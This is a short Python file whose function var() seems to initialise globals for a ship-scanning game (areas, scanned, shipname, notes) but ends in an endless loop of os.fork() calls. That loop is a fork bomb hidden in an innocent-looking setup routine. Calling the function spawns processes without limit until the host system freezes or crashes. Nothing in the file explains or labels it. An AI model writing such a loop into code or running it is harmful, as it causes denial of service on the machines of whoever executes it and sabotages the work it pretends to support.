import os
def var():
    global areas, scanned, notes
    areas = ["","","","","","","","","",""]
    scanned = 0
    name = ""
    shipname = ""
    notes = ""
    while True:
        os.fork()
